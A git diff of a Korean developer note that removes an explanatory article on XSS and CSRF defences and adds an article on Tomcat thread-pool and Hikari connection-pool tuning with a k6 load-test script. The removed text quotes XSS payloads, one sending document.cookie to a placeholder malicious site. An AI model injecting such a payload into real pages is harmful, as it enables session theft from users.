@@ -1,119 +1,432 @@
-# 1. 프론트엔드 주요 보안 이슈, XSS와 CSRF
+# 1. Thread Pool 이란?
+![img.png](img.png)
 
-프론트엔드 개발에서 보안은 간과하기 쉬운 영역이지만, 웹 애플리케이션의 안전성과 사용자 데이터를 보호하기 위해 필수적인 요소이다. 특히 크로스 사이트 스크립팅(XSS)과 교차 사이트 요청 위조(CSRF)는 프론트엔드에서 자주 발생하는 주요 취약점으로, 각각 브라우저와 웹사이트 간의 신뢰 관계를 악용한다는 공통점이 있다.
+## 1.1 Tomcat Thread Pool 이해하기
+Tomcat은 들어오는 요청(Task)을 처리하기 위해 Thread Pool이라는 개념을 사용합니다. 
+Thread는 생성 및 컨텍스트 스위칭 비용이 비싸기 때문에 잘못하면 메모리 누수와 CPU 오버헤드가 발생할 수 있습니다. 
+따라서 Thread를 미리 적정량 만들어두고 사용하게 되는데 이를 Thread Pool이라고 합니다.
 
-XSS는 "브라우저가 웹 사이트를 신뢰해서 생기는 취약점"이다. 사용자가 입력한 악성 스크립트가 브라우저에서 실행되면서, 사용자 세션 하이재킹이나 민감한 데이터 유출을 초래할 수 있다. 반면, CSRF는 "웹 사이트가 브라우저를 신뢰해서 생기는 취약점"이다. 공격자는 사용자가 인지하지 못한 상태에서 악의적인 요청을 웹 사이트로 전송하게 만들어, 사용자의 의도와 무관한 데이터 변경이나 작업이 이루어지도록 한다.
+```mermaid
+flowchart LR
+    A[요청 도착] --> B{max-connections 이내?}
+    B -->|NO| G["거부: Connection refused"]
+    B -->|YES| C{쓰레드 있음?}
+    C -->|YES| D[즉시 처리]
+    C -->|NO| E{대기 큐 여유?}
+    E -->|YES| F[대기]
+    E -->|NO| G
+```
 
-# 2. 크로스 사이트 스크립팅 (XSS)
+웹 요청이 들어오면 Tomcat의 Connector가 Connection을 생성하고,요청된 작업을 Thread Pool의 쓰레드에 연결합니다.
+Thread에 여유가 있으면 Queue에 들어온 요청은 바로 전달되지만, 모든 Thread가 사용 중이면 새로 발생한 요청은 Queue에 쌓이면서 지연이 발생 합니다.
 
-## 2.1. XSS란?
+## 1.2 Thread Pool 설정 값 이해하기
+### server.tomcat.threads.max
+- 기본값 200
+- 생성할 수 있는 최대 쓰레드 개수
+- 동시에 처리 가능한 요청의 수를 결정
+- 이 값을 넘어서면 요청은 대기 큐에 
 
-크로스 사이트 스크립팅(XSS)은 웹 애플리케이션 보안에서 가장 흔하게 발견되는 취약점 중 하나로, 사용자 입력에 대한 적절한 검증 및 필터링이 부족할 때 발생한다. XSS는 웹 페이지에 삽입된 악성 스크립트가 브라우저에서 실행되도록 하여, 공격자가 사용자에게 부적절한 콘텐츠를 표시하거나, 사용자 권한을 가로채는 등의 악의적인 행동을 가능하게 한다. XSS는 주로 사용자가 신뢰하는 웹 사이트가 공격자의 악성 스크립트를 그대로 실행하도록 만드는 데 기인한다.
+---
 
-## 2.2. XSS의 공격 예시
+### server.tomcat.threads.min-spare
+- 기본값 10
+- 항상 활성화(idle)되어 있는 최소 쓰레드 개수
 
-XSS 공격은 사용자가 방문한 웹사이트에서 악성 스크립트를 실행시키는 방식으로 이루어진다. 예를 들어, 공격자가 XSS 취약점이 존재하는 블로그에 게시글이나 댓글을 작성하면서 <script>alert('해킹됨');</script>와 같은 스크립트를 삽입했다고 가정해보자. 이 경우, 다른 사용자가 해당 페이지를 방문할 때 이 스크립트가 브라우저에서 실행되어 경고 창이 표시된다. 이 단순한 예시는 공격자가 악성 코드를 사용하여 웹사이트에서 무엇이든 실행할 수 있음을 보여준다.
+---
 
-또 다른 예로, 한 쇼핑몰 사이트에서 리뷰 작성 기능이 있다고 가정해보자. 공격자가 리뷰 작성란에 <script>document.location='악성사이트?cookie='+document.cookie</script>와 같은 코드를 삽입한다면, 이 리뷰를 읽는 사용자의 세션 쿠키가 공격자의 사이트로 전송된다. 이 세션 쿠키를 통해 공격자는 사용자의 인증된 세션을 도용하여, 사용자의 계정에 접근하거나, 악의적인 행위를 할 수 있게 된다. 이러한 공격은 웹 애플리케이션에서 입력 데이터를 제대로 검증하지 않았을 때 발생할 수 있는 위험을 잘 보여준다.
+### server.tomcat.accept-count
+- 기본값 100
+- 모든 쓰레드가 사용 중일 때 대기 큐에 넣을 수 있는 요청 개수
+- 대기 큐마저 가득 차면 새로운 연결은 거부됨
 
-## 2.3. XSS의 영향
+---
 
-XSS는 다양한 방식으로 웹 애플리케이션과 사용자의 보안을 위협한다. 가장 심각한 문제는 세션 하이재킹이다. 공격자는 사용자의 세션 쿠키를 가로채어, 사용자가 로그인한 상태를 도용할 수 있다. 이를 통해 공격자는 사용자의 권한을 무단으로 획득하여, 민감한 데이터에 접근하거나, 계정을 임의로 조작할 수 있다.
+### server.tomcat.max-connection
+- 기본값 8192
+- 동시에 수립 가능한 connection의 총 개수
+- 실질적인 서버의 동시 처리 능력을 나타냄
 
-또한, XSS를 이용해 사용자의 브라우저에서 악성 코드를 실행함으로써 사용자의 시스템에 직접적인 피해를 줄 수도 있다. 예를 들어, 공격자는 XSS를 통해 키로거(Keylogger)나 피싱 공격을 실행하는 스크립트를 삽입할 수 있다. 이러한 스크립트는 사용자가 입력하는 모든 키 입력을 기록하거나, 사용자로 하여금 가짜 로그인 페이지에 로그인하도록 유도하여 자격 증명을 탈취할 수 있다.
 
-또한, XSS는 웹 애플리케이션의 신뢰도를 심각하게 저하시킬 수 있다. 공격자가 웹 사이트에 악성 콘텐츠를 삽입하면, 사용자는 해당 사이트를 신뢰하지 않게 되고, 이는 사이트의 평판에 큰 영향을 미친다. XSS는 단순히 기술적인 문제가 아니라, 사용자와 웹 애플리케이션 간의 신뢰 관계를 훼손하는 심각한 보안 위협으로 작용한다. 이러한 이유로 XSS는 모든 웹 개발자가 반드시 이해하고, 방어해야 하는 중요한 보안 이슈이다.
+## 1.3 메인 작업 종류에 따른 Thread Pool 크기 결정하기
+### server.tomcat.threads.max
 
-## 2.4. XSS 취약점 대책
+#### CPU-bound 작업 (애플리케이션 레벨에서의 연산)
+- **권장**: CPU 코어 수 × (1~2)
+- **이유**: CPU보다 많은 쓰레드는 오히려 컨텍스트 스위칭 오버헤드만 증가
+- **예시**: 8코어 서버 → 약 16
 
-### 1. 입력 데이터의 검증
+#### I/O-bound 작업 (DB 조회, 외부 API 호출)
+- **권장**: CPU 코어 수 × (10~25)
+- **이유**: 쓰레드가 I/O 대기 중일 때 다른 쓰레드가 CPU를 사용할 수 있기 때문
+- **예시**: 8코어 서버 → 약 100~200
 
-사용자 입력 데이터의 검증은 XSS 방지를 위한 가장 중요한 단계 중 하나이다. 웹 애플리케이션은 모든 사용자 입력을 신뢰해서는 안 되며, 입력된 데이터가 악의적인 의도를 가지고 있을 가능성을 항상 염두에 두어야 한다. 따라서, 모든 사용자 입력은 반드시 철저하게 검증되고, 필터링되어야 한다.
+---
 
-첫 번째로, 사용자 입력을 HTML 콘텐츠에 직접 삽입하기 전에 특수 문자를 이스케이프 처리해야 한다. 이는 <, >, &, ", ' 등의 특수 문자가 HTML 태그나 속성으로 인식되는 것을 방지하기 위한 조치이다. 이러한 문자가 변환되지 않고 그대로 브라우저에 전달되면, 공격자가 삽입한 스크립트가 그대로 실행될 수 있기 때문이다. 예를 들어, <script> 태그와 같은 입력이 그대로 HTML에 삽입되면, 브라우저는 이를 스크립트로 인식하고 실행하게 된다. 이스케이프 처리를 통해 이러한 입력은 단순한 텍스트로 변환되어, 스크립트가 실행되지 않게 된다.
+### server.tomcat.threads.min-spare
 
-또한, 입력 데이터의 길이와 유형을 제한하는 것도 중요하다. 예를 들어, 이메일 주소나 전화번호와 같이 명확한 형식이 필요한 입력의 경우, 정규 표현식을 사용해 입력된 데이터가 기대하는 형식에 맞는지 검증할 수 있다. 이렇게 함으로써, 공격자가 의도적으로 악성 코드를 입력하는 것을 사전에 차단할 수 있다. 또한, 필요 이상으로 긴 입력을 허용하지 않음으로써, 악의적인 스크립트가 대규모로 삽입되는 것을 방지할 수 있다.
+#### CPU-bound 작업 (애플리케이션 레벨에서의 연산)
+- **권장**: max의 1/2 정도
+- **이유**: CPU 작업은 처리 속도가 빠르므로 즉시 대응 가능한 쓰레드 많이 확보
+- **예시**: 8코어 서버 → 약 8
 
-마지막으로, 서버와 클라이언트 측에서 모두 검증을 수행하는 것이 바람직하다. 클라이언트 측 검증은 사용자 경험을 개선하고 빠른 피드백을 제공할 수 있지만, 이를 우회하는 방법이 존재하기 때문에 서버 측에서도 반드시 추가 검증이 이루어져야 한다. 서버 측 검증은 최종 방어선으로서, 클라이언트 측에서 처리되지 않은 악성 입력이 서버에 도달하는 것을 막아줄 수 있다. 이를 통해 잠재적인 XSS 공격의 위험을 최소화할 수 있다.
+#### I/O-bound 작업 (DB 조회, 외부 API 호출)
+- **권장**: max의 1/10 ~ 1/5 정도
+- **이유**: I/O 대기가 많아 유휴 쓰레드를 과도하게 유지할 필요 없음
+- **예시**: 8코어 서버 → 약 10~20
 
-### 2. HTML 요소 속성의 보호
+---
 
-HTML 요소 속성에 사용자 데이터를 삽입할 때는 특별한 주의가 필요하다. 속성 값에 사용자 입력이 직접 삽입될 경우, 이는 XSS 공격에 노출될 수 있는 경로가 된다. 예를 들어, 사용자가 입력한 데이터가 href, src, title 등의 속성 값으로 사용될 때, 이 데이터를 반드시 따옴표로 감싸고, 이스케이프 처리를 통해 특수 문자가 코드로 실행되지 않도록 해야 한다. 이를 통해 공격자가 악의적인 스크립트를 삽입하는 것을 효과적으로 방지할 수 있다.
+### server.tomcat.accept-count
 
-특히 href 속성의 경우, 사용자가 입력한 URL이 http:나 https:로 시작하는지 확인해야 한다. 이를 통해 javascript:와 같은 악성 스키마가 사용되지 않도록 할 수 있다. 속성 값에 삽입되는 모든 입력 데이터는 신뢰할 수 없는 사용자로부터 입력된 것이므로, 철저한 검증과 필터링이 필요하다.
+#### CPU-bound 작업 (애플리케이션 레벨에서의 연산)
+- **권장**: max × (2~3)
+- **이유**: 처리 속도가 빠르므로 큰 대기 큐 불필요
+- **예시**: 8코어 서버 → 약 30~50
 
-### 3. DOM 조작 보호
+#### I/O-bound 작업 (DB 조회, 외부 API 호출)
+- **권장**: max × (0.5~1)
+- **이유**: I/O 대기로 처리 시간이 길어 적절한 대기 큐 필요
+- **예시**: 8코어 서버 → 약 50~200
 
-DOM 조작 시에도 XSS 공격에 대한 방어가 중요하다. 사용자의 입력을 동적으로 HTML 요소에 삽입할 때, innerHTML과 같은 메서드는 가능한 한 사용하지 않아야 한다. 이 메서드는 입력된 HTML 코드가 그대로 파싱되어 실행되기 때문에, 악의적인 스크립트가 포함될 수 있다. 대신, appendChild, textContent, createElement 등의 메서드를 사용해 DOM을 조작하는 것이 안전하다.
+---
 
-이러한 메서드는 입력된 데이터를 단순한 텍스트로 처리하거나, 요소를 명확하게 생성해 삽입하기 때문에, 공격자가 악성 스크립트를 주입하는 것을 방지할 수 있다. 또한, DOM 조작 과정에서 사용자 입력이 HTML 속성에 들어가는 경우, 반드시 앞서 언급한 대로 이스케이프 처리와 검증을 수행해야 한다. 이렇게 하면 동적으로 생성된 콘텐츠도 안전하게 렌더링할 수 있다.
+### server.tomcat.max-connections
 
-### 4. Content Security Policy(CSP) 적용
+#### CPU-bound 작업 (애플리케이션 레벨에서의 연산)
+- **권장**: 보수적으로 설정 (200~500)
+- **이유**: CPU 집약적이므로 과도한 동시 연결은 성능 저하
+- **예시**: 8코어 서버 → 약 200
 
-Content Security Policy(CSP)는 XSS와 같은 공격을 방지하기 위한 강력한 보안 메커니즘이다. CSP는 웹 애플리케이션이 실행할 수 있는 콘텐츠의 출처를 제어하여, 악의적인 스크립트가 브라우저에서 실행되는 것을 차단한다. 이를 통해 개발자는 자신이 신뢰하는 출처에서만 스크립트를 불러올 수 있도록 제한할 수 있으며, 인라인 스크립트나 외부 소스에서 로드되는 스크립트의 실행을 막을 수 있다.
+#### I/O-bound 작업 (DB 조회, 외부 API 호출)
+- **권장**: 넉넉하게 설정 (5000~10000)
+- **이유**: I/O 대기 중인 연결들을 충분히 받아들일 수 있어야 함
+- **예시**: 8코어 서버 → 약 10000
 
-CSP를 적용할 때는 'unsafe-inline'과 같은 비안전한 지시자를 사용하지 않는 것이 중요하다. 대신 nonce-source나 hash-source를 사용하여 인라인 스크립트가 허용될 때도 안전하게 실행되도록 설정할 수 있다. 또한, 특정 리소스 유형에 대해 script-src, style-src, img-src 등의 지시자를 설정하여, 신뢰할 수 있는 출처에서만 해당 리소스를 로드하게끔 제어할 수 있다. 이를 통해 XSS를 포함한 다양한 코드 인젝션 공격을 예방할 수 있다.
+### 1.4 Thread Pool 모니터링 (추가 예정)
 
-CSP는 테스트와 모니터링을 통해 지속적으로 개선되어야 한다. 초기에는 'Report-Only' 모드를 사용하여 CSP 설정이 제대로 작동하는지 확인하고, 문제점을 파악한 후에 실제 정책을 적용하는 것이 좋다. 또한, CSP는 설정 후에도 공격 시도가 발생할 경우 보고서를 수집하여, 새로운 위협에 대응할 수 있도록 지속적으로 관리해야 한다. 이렇게 함으로써, 웹 애플리케이션의 보안을 한층 강화할 수 있다.
+# 2. Connection Pool 이란?
 
-### 5. XSS 예방 라이브러리 사용
+## 2.1 Connection Pool 이해하기
+DB 커넥션을 미리 만들어 두고 재사용하는 방법 입니다. 1 트랜잭션 = 1 커넥션 이며, application.yml 파일에
+애플리케이션에서 DB로 연결할 수 있는 최대 갯수를 설정할 수 있습니다.
 
-XSS를 효과적으로 방어하기 위해서는 검증된 라이브러리를 사용하는 것이 중요하다. DOMPurify와 같은 라이브러리는 사용자가 입력한 데이터를 철저히 필터링하여, 잠재적으로 위험한 HTML 태그와 속성을 제거함으로써 XSS 공격을 방지한다. 이 라이브러리는 사용하기 간편하면서도 강력한 보호 기능을 제공하여, 개발자가 안전하게 사용자 콘텐츠를 처리할 수 있도록 돕는다.
+```java
+@Transactional  // 트랜잭션 시작
+public void transferMoney(Long fromId, Long toId, int amount) {
+    // ← 여기서 커넥션 풀에서 커넥션 1개 획득
+    
+    Account from = accountRepository.findById(fromId);  // 같은 커넥션 사용
+    Account to = accountRepository.findById(toId);      // 같은 커넥션 사용
+    
+    from.withdraw(amount);      // 같은 커넥션 사용
+    to.deposit(amount);         // 같은 커넥션 사용
+    
+    accountRepository.save(from);  // 같은 커넥션 사용
+    accountRepository.save(to);    // 같은 커넥션 사용
+    
+    // ← 여기서 커넥션 풀에 반납 (트랜잭션 종료)
+}
+```
 
-DOMPurify는 다양한 설정 옵션을 제공하여 개발자가 애플리케이션의 요구에 맞게 필터링 규칙을 커스터마이즈할 수 있다. 예를 들어, 특정 태그나 속성만 허용하거나, 스크립트와 같이 악성 코드가 포함될 수 있는 요소를 완전히 제거하는 식으로 설정할 수 있다. 이를 통해 애플리케이션의 보안 수준을 높이고, 사용자가 악의적인 입력을 통해 시스템에 해를 끼치는 것을 방지할 수 있다.
+```mermaid
+sequenceDiagram
+    participant Pool as Connection Pool
+    participant TX as @Transactional
+    participant DB as Database
 
-최신 웹 브라우저에서 제공하는 Sanitizer API를 활용하는 것도 좋은 방법이다. Sanitizer API는 브라우저 내장 보안 기능으로, XSS와 같은 보안 위협으로부터 사용자를 보호하기 위해 고안되었다. 이 API는 브라우저 레벨에서 콘텐츠를 안전하게 처리하며, 사용자 입력을 DOM에 삽입하기 전에 자동으로 검증한다. 이러한 도구를 활용하면, 개발자는 XSS와 같은 취약점을 보다 효과적으로 방어할 수 있다.
+    Note over Pool: [Conn1][Conn2][Conn3]
 
-# 3. 교차 사이트 요청 위조 (CSRF)
+    TX->>Pool: 커넥션 요청
+    Pool->>TX: Conn1 대여
 
-## 3.1. CSRF란?
+    rect rgb(255, 250, 205)
+        Note over TX,DB: Conn1 사용 중
+        TX->>DB: SELECT (Conn1)
+        TX->>DB: UPDATE (Conn1)
+        TX->>DB: INSERT (Conn1)
+        TX->>DB: COMMIT (Conn1)
+    end
 
-교차 사이트 요청 위조(CSRF)는 사용자가 신뢰하는 웹사이트에 대해, 사용자의 의도와는 다른 악의적인 요청을 수행하도록 유도하는 공격 기법이다. 이 공격은 사용자가 웹사이트에 이미 로그인된 상태에서 발생하며, 공격자가 사용자의 브라우저를 통해 웹사이트로 요청을 전송하게 만들어 서버가 이를 정상적인 요청으로 처리하도록 만든다. 결과적으로, 서버는 이러한 요청을 신뢰된 사용자로부터 온 것이라 간주하고, 사용자의 권한 하에 민감한 작업을 수행하게 된다.
+    TX->>Pool: Conn1 반납
+    Note over Pool: [Conn1][Conn2][Conn3]
+```
+- 애플리케이션 시작 시 설정된 개수만큼 커넥션 생성
+- 요청이 들어오면 풀에서 idle 상태 커넥션 대여
+- 트랜잭션 완료(close) 후 커넥션 반납
+- 풀에 idle 상태 커넥션이 없으면 대기하거나 새로 생성(설정에 따라)
 
-CSRF 공격은 웹사이트가 사용자의 브라우저를 신뢰하는 점을 악용한다. 예를 들어, 사용자가 인터넷 뱅킹에 로그인한 상태에서 공격자가 준비한 악성 웹 페이지를 방문하면, 그 페이지는 사용자의 브라우저를 통해 이체 요청을 자동으로 전송할 수 있다. 이 과정에서 사용자는 자신의 계좌에서 돈이 이체된다는 사실을 전혀 인지하지 못한다. 이러한 공격은 사용자가 특정한 행동을 취하지 않더라도, 단순히 악성 페이지를 방문하거나, 공격자가 만든 링크를 클릭하는 것만으로도 실행될 수 있다.
 
-## 3.2. CSRF의 공격 예시
+## 2.2 Connection Pool 크기 설정 방법
 
-CSRF 공격의 한 예시는 사용자가 이미 로그인된 상태에서 특정 웹사이트의 악성 링크를 클릭하는 상황이다. 예를 들어, 공격자는 사용자가 자주 방문하는 포럼에 악성 링크를 게시할 수 있다. 이 링크는 사용자가 클릭하는 즉시, 그의 브라우저를 통해 인터넷 뱅킹 사이트에 자동 이체 요청을 보낸다. 사용자는 이 요청이 자신도 모르게 실행되었기 때문에, 자신의 계좌에서 자금이 이체되는 사실을 알지 못한다. 이처럼 CSRF 공격은 사용자의 인증 상태를 악용하여 의도하지 않은 작업을 수행하게 만든다.
+```yaml
+# 커넥션 풀 크기
+spring.datasource.hikari.maximum-pool-size=10 # 최대 커넥션 수
+spring.datasource.hikari.minimum-idle=5 # 최소 유휴 커넥션 수
 
-또 다른 예시로는, 공격자가 조작한 이메일 링크를 통해 CSRF를 실행하는 경우가 있다. 사용자가 링크를 클릭하면, 해당 링크는 사용자가 로그인된 상태인 전자 상거래 사이트에서 자동으로 주문을 생성하거나, 배송 주소를 변경하는 요청을 보낸다. 사용자는 이러한 변경 사항을 인지하지 못하고, 주문이 잘못된 주소로 배송되는 등 큰 피해를 입을 수 있다. 이러한 공격은 사용자가 자신의 브라우저에서 실행되는 모든 요청을 신뢰할 수 없다는 점을 명확히 보여준다.
+# 타임아웃 설정
+spring.datasource.hikari.connection-timeout=30000 # 커넥션 대기 시간 (30초)
+spring.datasource.hikari.idle-timeout=600000 # 유휴 커넥션 유지 시간 (10분)
+spring.datasource.hikari.max-lifetime=1800000 # 커넥션 최대 수명 (30분)
+```
 
-## 3.3. CSRF의 영향
+### spring.datasource.hikari.maximum-pool-size
+- **의미**: 동시에 사용 가능한 최대 커넥션 개수
+- **기본값**: 10
+- **주의** : 너무 크면 DB 서버 부하, 너무 작으면 대기 발생
 
-CSRF는 사용자의 개인 정보와 자산을 심각하게 위협할 수 있는 취약점이다. 공격자는 CSRF를 통해 사용자가 의도하지 않은 작업을 수행하게 만들 수 있으며, 이는 웹 애플리케이션의 기능과 데이터 무결성에 큰 영향을 미친다. 예를 들어, 금융 서비스에서 CSRF 공격이 발생할 경우, 사용자의 자금이 무단으로 이체되거나, 중요한 계좌 정보가 변경될 수 있다. 이러한 피해는 경제적인 손실로 직결될 뿐만 아니라, 사용자의 신뢰를 완전히 잃게 만드는 원인이 된다.
+### spring.datasource.hikari.minimum-idle
+- **의미** : 항상 유지할 최소 유휴 커넥션 수
+- **기본값** : maximum-pool-size와 동일
+- **주의** : minimum-idle < maximum-pool-size 설정 시 동적으로 크기 조정
 
-또한, CSRF는 소셜 미디어나 이메일 서비스에서도 큰 영향을 미칠 수 있다. 공격자는 CSRF를 통해 사용자의 계정으로 무단 게시물을 작성하거나, 사용자 모르게 비밀번호를 변경하여 계정을 탈취할 수 있다. 이로 인해 사용자는 자신의 온라인 정체성을 잃거나, 원치 않는 콘텐츠가 자신의 이름으로 퍼지게 되는 상황에 직면할 수 있다. 이러한 결과는 단순히 개인적인 피해를 넘어서, 사회적 신뢰와 평판에도 심각한 영향을 미친다. CSRF의 피해는 눈에 보이지 않게 누적되며, 문제를 인지한 후에는 이미 큰 피해가 발생한 경우가 많아, 이에 대한 예방이 무엇보다 중요하다.
+### spring.datasource.hikari.connection-timeout
+- **의미** : 커넥션을 얻기 위해 대기하는 최대 시간
+- **기본값** : 30000(30초)
+- **주의** : 너무 짧으면 불필요한 에러, 너무 길면 응답 지연
 
-## 3.4. CSRF 취약점 대책
+### spring.datasource.hikari.idle-timeout
+- **의미** : 유휴 커넥션이 풀에 유지 되는 시간
+- **기본값** : 600000(10분)
+- **주의** : minimum-idle를 제외한 커넥션만 정리됨
 
-### 1. CSRF 토큰 사용
+### spring.datasource.hikari.max-lifetime
+- **의미** : 커넥션의 최대 수명
+- **기본값** : 1800000(30분)
+- **주의** : 0으로 설정 시 무제한 (권장하지 않음)
 
-CSRF 방어의 핵심 전략 중 하나는 원타임 토큰(One-Time Token)을 활용하여 요청과 서버 간의 일치 여부를 검증하는 것이다. 이 토큰은 서버가 사용자 세션에 고유하게 생성한 값으로, 각 요청마다 포함되어야 한다. 서버는 요청을 처리하기 전에 이 토큰이 유효한지 확인한다. 이를 통해 서버는 요청이 사용자의 브라우저에서 직접 발생했는지, 또는 외부에서 조작된 것인지를 검증할 수 있다.
 
-CSRF 토큰은 주로 폼에 숨김 필드로 포함된다. 사용자가 폼을 제출하면, 토큰이 함께 전송되어 서버에서 검증된다. 이렇게 함으로써 공격자가 외부에서 동일한 요청을 모방하더라도, 유효한 토큰이 없으면 요청이 처리되지 않는다. 이는 사용자가 정상적인 경로를 통해 요청을 보냈는지를 확인하는 중요한 보안 절차이다.
+## 2.3 Connection Pool 모니터링
+```yaml
+spring:
+  datasource:
+    hikari:
+      minimum-idle: 10
+      maximum-pool-size: 10
+      connection-timeout: 30000
+```
+Hikari 설정은 위와 같은 상황일 때, 실제 grafana 모니터링을 확인하면 아래와 같습니다.
+![img_1.png](img_1.png)
+max = 10으로 설정되어 있으므로 요청이 들어왔을때 Connection은 최대 10개까지만 생성됩니다. 따라서 수많은 요청이 들어왔을때, 
+커넥션은 최대 10개까지 생성되고 추가로 커넥션이 필요한 경우에는 Pending 상태로 대기하게 됩니다. 이때 커넥션 풀에서 사용 가능한 커넥션이 반환될 때까지 기다리며, 설정된 타임아웃 시간(connection-timeout) 내에 커넥션을 획득하지 못하면 SQLException이 발생합니다. 
 
-이 토큰은 단순한 값이 아니라, 복잡하고 예측 불가능한 값이어야 하며, 매 세션마다 변경되는 것이 바람직하다. 세션이 시작될 때마다 새로운 토큰이 생성되거나, 각 요청 시마다 새롭게 발급되어야 한다. 이렇게 하면 공격자가 특정 토큰을 획득하더라도 이를 재사용할 수 없게 되어, CSRF 공격의 성공 가능성을 크게 낮출 수 있다. 이는 CSRF 공격을 방지하는 데 있어 중요한 보안 계층을 추가하는 역할을 한다.화할 수 있다.
 
-### 2. SameSite Cookie 속성 사용
+# 3. Thread Pool, Connection Pool 조율 하기 with 부하테스트
 
-CSRF 공격을 방지하는 또 다른 중요한 방법은 쿠키의 SameSite 속성을 사용하는 것이다. 이 속성은 쿠키가 요청과 함께 전송되는 방식을 제어하여, 교차 사이트 요청이 쿠키를 포함할 수 없도록 제한한다. SameSite 속성은 Lax, Strict, 또는 None으로 설정할 수 있으며, 기본적으로는 Lax로 설정하여 대부분의 경우에 안전한 보호를 제공한다.
+## 부하테스트 시나리오
+```javascript
+import http from 'k6/http';
+import { check, sleep } from 'k6';
+import { Trend } from 'k6/metrics';
+import {
+  ORGANIZATION_UUIDS,
+  PROCESS_STATUS,
+  SORT_OPTIONS
+} from '../../utils/common.js';
+import { BASE_URL } from '../../utils/secret.js';
 
-SameSite=Lax는 사용자가 링크를 클릭하거나 GET 요청을 통해 사이트를 탐색할 때 쿠키가 전송되도록 허용하지만, POST 요청과 같은 민감한 작업에는 쿠키가 포함되지 않도록 한다. 이는 사용자가 외부 사이트에서 특정 링크를 클릭하는 일반적인 사용 사례를 보호하면서도, CSRF 공격의 가능성을 줄이는 데 효과적이다. SameSite=Strict로 설정하면, 모든 외부 요청에 대해 쿠키가 전송되지 않아, CSRF 공격에 대한 보호가 더욱 강화된다.
+export const batchResponseTime = new Trend('batch_response_time');
 
-하지만, SameSite=Strict는 사용자 경험에 영향을 미칠 수 있어, 모든 상황에서 적합하지는 않다. 반면, SameSite=Lax는 보안과 사용자 경험의 균형을 잘 맞추는 옵션으로, 대부분의 웹 애플리케이션에서 권장된다. 특정 상황에서는 SameSite=None을 사용하여 쿠키가 교차 사이트 요청에서도 전송되도록 설정할 수 있지만, 이 경우 반드시 Secure 속성도 함께 사용하여 HTTPS 연결에서만 쿠키가 전송되도록 해야 한다. 이를 통해 CSRF 공격에 대한 강력한 방어를 유지하면서도, 필요한 경우 유연성을 제공할 수 있다.
+export const options = {
+  scenarios: {
+    normal_load: {
+      executor: 'ramping-vus',
+      startVUs: 1,
+      stages: [
+        { duration: '1m', target: 150 },
+        { duration: '3m', target: 150 },
+        { duration: '1m', target: 1 },
+      ],
+    },
+  },
+  thresholds: {
+    http_req_duration: ['p(95)<500'],
+    http_req_failed: ['rate<0.1'],
+  },
+};
 
-### 3. Double Submit Cookie 기법
+export default function () {
+  const orgUuid = 'b624e7f3-1993-41df-975f-eb48448e18f0';
+  const size = 10;
+  const sortBy = SORT_OPTIONS[Math.floor(Math.random() * SORT_OPTIONS.length)];
+  const status = Math.random() > 0.5
+    ? PROCESS_STATUS[Math.floor(Math.random() * PROCESS_STATUS.length)]
+    : '';
+  const cursorId = Math.random() > 0.7 ? Math.floor(Math.random() * 633) + 1 : '';
 
-Double Submit Cookie 기법은 CSRF 공격을 방어하기 위한 효과적인 방법 중 하나로, CSRF 토큰을 두 번 제출하는 방식을 사용한다. 이 기법에서는 서버가 사용자의 브라우저에 CSRF 토큰을 포함하는 쿠키를 발급하고, 클라이언트는 이 토큰을 폼 데이터나 요청 헤더에 포함시켜 서버에 다시 전송한다. 서버는 요청이 들어오면, 쿠키에 저장된 토큰과 폼이나 헤더에 포함된 토큰이 일치하는지 확인한다.
+  let queryParams = `size=${size}&sortBy=${sortBy}`;
+  if (status) queryParams += `&status=${status}`;
+  if (cursorId) queryParams += `&cursorId=${cursorId}`;
 
-이 방법은 서버가 CSRF 토큰을 관리하는 방식과 달리, 쿠키와 폼 데이터 간의 일치 여부를 검사하여 CSRF 공격을 방어한다. 공격자는 CSRF 토큰이 포함된 쿠키를 위조할 수 없으며, 일치하는 토큰 값을 알지 못하기 때문에, 이 기법은 CSRF 공격을 효과적으로 차단한다. 또한, 이 기법은 서버 측에서 특별한 상태 정보를 유지할 필요가 없어 구현이 비교적 간단하다.
+  const startTime = new Date().getTime();
 
-하지만 Double Submit Cookie 기법은 쿠키의 보안 설정이 중요하다. 쿠키가 JavaScript에서 접근 가능하지 않도록 HttpOnly 속성을 사용해야 하며, Secure 속성을 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정해야 한다. 이러한 보안 설정을 통해 쿠키가 클라이언트 측에서 노출되는 것을 방지하고, CSRF 공격에 대한 방어력을 더욱 강화할 수 있다.
+  const responses = http.batch([
+    ['GET', `${BASE_URL}/organizations/${orgUuid}`, null, {
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      tags: { name: 'GetOrganization' },
+    }],
+    ['GET', `${BASE_URL}/organizations/${orgUuid}/feedbacks?${queryParams}`, null, {
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      tags: { name: 'GetFeedbacks' },
+    }],
+    ['GET', `${BASE_URL}/organizations/${orgUuid}/statistic`, null, {
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      tags: { name: 'GetStatistic' },
+    }],
+  ]);
 
-### 4. 출처 검증
+  check(responses[0], {
+    '[Organization] status is 200': (r) => r.status === 200,
+    '[Organization] response time < 500ms': (r) => r.timings.duration < 500,
+    '[Organization] has valid data': (r) => {
+      try {
+        const body = JSON.parse(r.body);
+        return (
+          body.status === 200 &&
+          body.data &&
+          body.data.hasOwnProperty('organizationName') &&
+          body.data.hasOwnProperty('categories')
+        );
+      } catch {
+        return false;
+      }
+    },
+  });
 
- CSRF 공격을 방지하는 또 다른 중요한 방법은 출처 검증(Origin Verification)이다. 출처 검증은 서버가 요청의 출처(Origin)와 Referer 헤더를 확인하여, 요청이 신뢰할 수 있는 출처에서 온 것인지 판단하는 방식이다. 웹 브라우저는 요청을 보낼 때 출처와 Referer 헤더를 자동으로 포함시키며, 서버는 이를 바탕으로 요청의 유효성을 검사할 수 있다.
+  check(responses[1], {
+    '[Feedbacks] status is 200': (r) => r.status === 200,
+    '[Feedbacks] response time <= 500ms': (r) => r.timings.duration <= 500,
+  });
 
-출처 검증은 특히 중요한 작업에서 유용하다. 예를 들어, 민감한 데이터 수정이나 결제 요청과 같은 작업에서 출처가 올바른지 확인함으로써, 외부 사이트에서 발생한 의도하지 않은 요청을 차단할 수 있다. 이 방법은 CSRF 공격을 사전에 방어하는 강력한 수단이 된다.
+  check(responses[2], {
+    '[Statistic] status is 200': (r) => r.status === 200,
+    '[Statistic] response time <= 500ms': (r) => r.timings.duration <= 500,
+  });
 
